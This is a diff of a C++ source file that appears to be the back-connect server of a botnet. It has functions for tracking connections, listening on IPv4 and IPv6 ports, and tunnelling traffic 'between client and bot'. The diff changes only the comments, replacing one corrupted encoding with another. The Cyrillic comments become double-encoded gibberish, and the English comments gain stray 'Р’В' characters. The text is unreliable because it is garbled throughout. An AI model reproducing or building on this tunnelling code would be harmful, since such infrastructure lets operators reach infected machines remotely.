@@ -26,7 +26,7 @@ typedef struct
 static HANDLE eventQuit;
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-// Working with Handel's table.
+//Р’В Working with Handel's table.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
@@ -43,7 +43,7 @@ static DWORD bccListCount;
 static CRITICAL_SECTION csBccConnect;
 
 /*
-  �������� �������� ��� ��������� ������ ����������.
+  РЎРѕР·РґР°РЅРёРµ СЂРµСЃСѓСЂСЃРѕРІ РґР»СЏ РєРѕРЅС‚РЅСЂРѕР»СЏ СЃРїРёСЃРєР° СЃРѕРµРґРёРЅРµРЅРёР№.
 */
 static void initBccConnect(void)
 {
@@ -54,7 +54,7 @@ static void initBccConnect(void)
 }
 
 /*
-  ������������ �������� ��� ��������� ������ ����������.
+  РћСЃРІРѕР±РѕР¶РґРµРЅРёСЏ СЂРµСЃСѓСЂСЃРѕРІ РґР»СЏ РєРѕРЅС‚РЅСЂРѕР»СЏ СЃРїРёСЃРєР° СЃРѕРµРґРёРЅРµРЅРёР№.
 */
 static void uninitBccConnect(void)
 {
@@ -62,11 +62,11 @@ static void uninitBccConnect(void)
 }
 
 /*
-  ����� ������ ����������.
+  РџРѕРёСЃРє РґР°РЅРЅС‹С… СЃРѕРµРґРёРЅРµРЅРёСЏ.
 
-  IN id - ID ����������.
+  IN id - ID СЃРѕРµРґРёРЅРµРЅРёСЏ.
 
-  Return - ������ ����������, ��� NULL - ���� ��� �� �������.
+  Return - РґР°РЅРЅС‹Рµ СЃРѕРµРґРёРЅРµРЅРёСЏ, РёР»Рё NULL - РµСЃР»Рё РѕРЅРѕ РЅРµ РЅР°Р№РґРµРЅРѕ.
 */
 static BCCCONNECT *getBccConnect(DWORD id)
 {
@@ -75,11 +75,11 @@ static BCCCONNECT *getBccConnect(DWORD id)
 }
 
 /*
-  ���������� ������ ���������� � ������.
+  Р”РѕР±Р°РІР»РµРЅРёРµ РЅРѕРІРѕРіРѕ СЃРѕРµРґРёРЅРµРЅРёСЏ РІ СЃРїРёСЃРѕРє.
 
-  IN client - ����� ��� ����������.
+  IN client - СЃРѕРєРµС‚ РґР»СЏ РґРѕР±Р°РІР»РµРЅРёСЏ.
 
-  Return    - ID ����������, ��� 0 - � ������ ������.
+  Return    - ID СЃРѕРµРґРёРЅРµРЅРёСЏ, РёР»Рё 0 - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static DWORD addBccConnect(SOCKET client)
 {
@@ -126,9 +126,9 @@ static DWORD addBccConnect(SOCKET client)
 }
 
 /*
-  �������� ���������� � ������������ ���� ��������.
+  Р—Р°РєСЂС‹С‚РёРµ СЃРѕРµРґРёРЅРµРЅРёРµ Рё РѕСЃРІРѕР±РѕР¶РґРµРЅРёРµ РІСЃРµС… СЂРµСЃСѓСЂСЃРѕРІ.
 
-  IN id - ID ����������.
+  IN id - ID СЃРѕРµРґРёРЅРµРЅРёСЏ.
 */
 static void closeBccConnect(DWORD id)
 {
@@ -169,9 +169,9 @@ static void closeBccConnect(DWORD id)
 }
 
 /*
-  ������ ����� �������� � �����
+  РўСѓРЅРµР»СЊ РјРµР¶РґСѓ РєР»РёРµРЅС‚РѕРј Рё Р±РѕС‚РѕРј
 
-  IN p   - DWORD, ID ����������.
+  IN p   - DWORD, ID СЃРѕРµРґРёРЅРµРЅРёСЏ.
 
   Return - 0.
 */
@@ -225,9 +225,9 @@ static DWORD WINAPI sockTunnel(void *p)
 }
 
 /*
-  ����� ���������� �� �������� � �����.
+  РџСЂРёРµРј СЃРѕРµРґРёРЅРµРЅРёР№ РѕС‚ РєР»РёРµРЅС‚РѕРІ Рё Р±РѕС‚РѕРІ.
 
-  IN gsd - ������ �������.
+  IN gsd - РґР°РЅРЅС‹Рµ СЃРѕРєРµС‚РѕРІ.
 */
 static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
 {
@@ -368,7 +368,7 @@ NEXT:;
 }
 
 /*
-  ������ �������, ��� ��������� ��������.
+  РљСЌР»Р±СЌРє РєРѕРЅСЃРѕР»Рё, РґР»СЏ РѕСЃС‚Р°РЅРѕРІРєРё РїСЂРѕС†РµСЃСЃР°.
 
   Return - TRUE.
 */
@@ -379,11 +379,11 @@ static BOOL WINAPI handlerRoutine(DWORD)
 }
 
 /*
-  �������� �������� �� IPv4.
+  РЎРѕР·РґР°РЅРёРµ Р»РёСЃС‚РёРЅРіР° РЅР° IPv4.
 
-  IN port - ����.
+  IN port - РїРѕСЂС‚.
 
-  Return  - ����� ������, ��� INVALID_SOCKET.
+  Return  - С…СЌРЅРґР» СЃРѕРєРµС‚Р°, РёР»Рё INVALID_SOCKET.
 */
 static SOCKET listenPortIpv4(WORD port)
 {
@@ -397,11 +397,11 @@ static SOCKET listenPortIpv4(WORD port)
 }
 
 /*
-  �������� �������� �� IPv6.
+  РЎРѕР·РґР°РЅРёРµ Р»РёСЃС‚РёРЅРіР° РЅР° IPv6.
 
-  IN port - ����.
+  IN port - РїРѕСЂС‚.
 
-  Return  - ����� ������, ��� INVALID_SOCKET.
+  Return  - С…СЌРЅРґР» СЃРѕРєРµС‚Р°, РёР»Рё INVALID_SOCKET.
 */
 static SOCKET listenPortIpv6(WORD port)
 {
@@ -415,7 +415,7 @@ static SOCKET listenPortIpv6(WORD port)
 }
 
 /*
-  ����� �����.
+  РўРѕС‡РєР° РІС…РѕРґР°.
 */
 void commandListen(LPWSTR *switches, DWORD switchesCount)
 {  
@@ -451,12 +451,12 @@ void commandListen(LPWSTR *switches, DWORD switchesCount)
   bool ipv4 = (Cui::_getSwitchValue(switches, switchesCount, lng_switch_ipv4) == (LPWSTR)1);
   bool ipv6 = (Cui::_getSwitchValue(switches, switchesCount, lng_switch_ipv6) == (LPWSTR)1);
 
-  /*    
-    Specifying the default protocol.
-    
-    In the distant future, when the basic protocol would ipv6, needs to be replaced this line
-    respectively.
-  */
+  /*Р’В Р’В Р’В Р’В 
+Р’В Р’В Р’В Р’В Specifying the default protocol.
+Р’В Р’В Р’В Р’В 
+Р’В Р’В Р’В Р’В In the distant future, when the basic protocol would ipv6, needs to be replaced this line
+Р’В Р’В Р’В Р’В respectively.
+Р’В Р’В */
   if(!ipv4 && !ipv6)ipv4 = true;
   
   //Create a socket.
